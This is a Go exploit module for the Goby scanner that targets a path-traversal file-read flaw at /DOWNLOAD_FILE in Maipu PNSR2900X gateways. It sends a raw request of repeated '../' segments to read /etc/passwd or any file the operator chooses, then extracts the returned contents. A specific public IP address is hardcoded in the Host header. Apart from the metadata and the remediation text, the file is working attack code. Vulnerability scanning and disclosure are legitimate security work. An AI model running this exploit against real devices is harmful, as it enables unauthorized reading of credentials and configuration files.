package exploits

import (
	"crypto/tls"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "TIP PNSR2900X System Interface /DOWNLOAD_FILE File Read Vulnerability",
    "Description": "<p>Founded in 1993, Maipu Communication Technology Co., Ltd. is a leading provider of network products and solutions in China, and one of the four major network equipment manufacturers supported by the Ministry of Industry and Information Technology. The company joined China Electronics Corporation (CEC) in 2015 and is a strategic core enterprise in the field of network security and informatization.</p>",
    "Product": "Maplexin-Tech-Co.,-Ltd.",
    "Homepage": "https://www.maipu.cn/GuanYu/JianJie",
    "DisclosureDate": "2024-10-15",
    "PostTime": "2024-11-13",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"登录\" && body=\"/assets/css/ui-dialog.css\"",
    "GobyQuery": "body=\"登录\" && body=\"/assets/css/ui-dialog.css\"",
    "Level": "2",
    "Impact": "<p>Attackers can read sensitive files on the system, such as configuration files, password files, and log files, and obtain sensitive data such as user credentials and database connection information.</p>",
    "Recommendation": "<p>1. Hard code or unify the file name parameters passed by users, whitelist control file types, and reject parameters containing malicious or null characters.</p><p> 2. Public files can be placed in the download directory of web applications and downloaded through links </p><p>3. The manufacturer has released the latest fix version. Follow us <a href=\"https://www.maipu.cn/GuanYu/JianJie\">https://www.maipu.cn/GuanYu/JianJie</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E8%BF%88%E6%99%AE%E5%A4%9A%E4%B8%9A%E5%8A%A1%E8%9E%8D%E5%90%88%E7%BD%91%E5%85%B3/%E8%BF%88%E6%99%AEpnsr2900x%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3DOWNLOAD_FILE%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "迈普pnsr2900x系统接口 /DOWNLOAD_FILE 文件读取漏洞",
            "Product": "迈普通信技术股份有限公司",
            "Description": "<p>迈普通信技术股份有限公司成立于1993年，是国内领先的网络产品及解决方案供应商，工信部重点支持的四大国产网络设备厂商之一。公司于2015年加入中国电子信息产业集团有限公司（CEC），是CEC网络安全与信息化领域的战略核心企业。<br></p>",
            "Recommendation": "<p>1、对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。<br></p><p>2、公开文件可放置在web应用程序下载目录中通过链接进行下载<br>3、该厂商已发布最新修复版本 关注<a href=\"https://www.maipu.cn/GuanYu/JianJie\">https://www.maipu.cn/GuanYu/JianJie</a></p>",
            "Impact": "<p>攻击者可以读取系统上的敏感文件，如配置文件、密码文件、日志文件等，从中获取用户凭证、数据库连接信息等敏感数据。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "TIP PNSR2900X System Interface /DOWNLOAD_FILE File Read Vulnerability",
            "Product": "Maplexin-Tech-Co.,-Ltd.",
            "Description": "<p>Founded in 1993, Maipu Communication Technology Co., Ltd. is a leading provider of network products and solutions in China, and one of the four major network equipment manufacturers supported by the Ministry of Industry and Information Technology. The company joined China Electronics Corporation (CEC) in 2015 and is a strategic core enterprise in the field of network security and informatization.<br></p>",
            "Recommendation": "<p>1. Hard code or unify the file name parameters passed by users, whitelist control file types, and reject parameters containing malicious or null characters.</p><p>&nbsp;2. Public files can be placed in the download directory of web applications and downloaded through links&nbsp;</p><p>3. The manufacturer has released the latest fix version. Follow us <a href=\"https://www.maipu.cn/GuanYu/JianJie\">https://www.maipu.cn/GuanYu/JianJie</a><br></p>",
            "Impact": "<p>Attackers can read sensitive files on the system, such as configuration files, password files, and log files, and obtain sensitive data such as user credentials and database connection information.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`
	//tcp发http请求包，
	tcpHttpConnection5362341 := func(hostInfo *httpclient.FixUrl, dataContent string) string {
		conn, err := httpclient.GetTCPConn(hostInfo.HostInfo)
		if err != nil {
			return ""
		}
		// 设置超时时间，比如 10 秒
		timeoutDuration := 10 * time.Second
		conn.SetDeadline(time.Now().Add(timeoutDuration))

		if strings.HasSuffix(hostInfo.FixedHostInfo, "https") {
			conn = tls.Client(conn, &tls.Config{
				//MinVersion:         tls.VersionTLS10,
				InsecureSkipVerify: true,
			})
		}
		defer conn.Close()
		request := fmt.Sprintf(
			"GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../..%s HTTP/1.1\r\n"+
				"Host: 103.90.158.74\r\n"+
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\r\n"+
				"Connection: close\r\n\r\n",
			dataContent,
		)
		// TCP 发包
		_, err = conn.Write([]byte(request))
		resp := make([]byte, 0)
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				// 处理读取错误
				break
			}
			resp = append(resp, buf[:n]...)
			if n < len(buf) {
				break // 数据已经全部读取完毕
			}
		}
		return string(resp)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../.."
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
			}
			// 函数继承
			//uploadFileFunc := postOrGet_m9jXTEDGmn
			uploadFileFunc := tcpHttpConnection5362341

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp := uploadFileFunc(u, fileUrl)
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL + fileUrl
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}

			// 此处需要修改：函数继承
			uploadFileFunc := tcpHttpConnection5362341

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp := uploadFileFunc(expResult.HostInfo, fileUrl)
			if !strings.Contains(resp, fileText) && mode != "Customize" {
				expResult.Success = false
				return expResult
			}
			//匹配提取关键信息
			re := regexp.MustCompile(`(?s)Content-Type: application/binary\s*(.*?)\s*$`)
			matches := re.FindStringSubmatch(resp)
			var result string
			if len(matches) > 1 {
				result = matches[1]
				// 移除末尾的换行符
				result = regexp.MustCompile(`\n$`).ReplaceAllString(result, "")
			} else {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = "Sensitive information leakage\n" + result
			return expResult
		},
	))
}
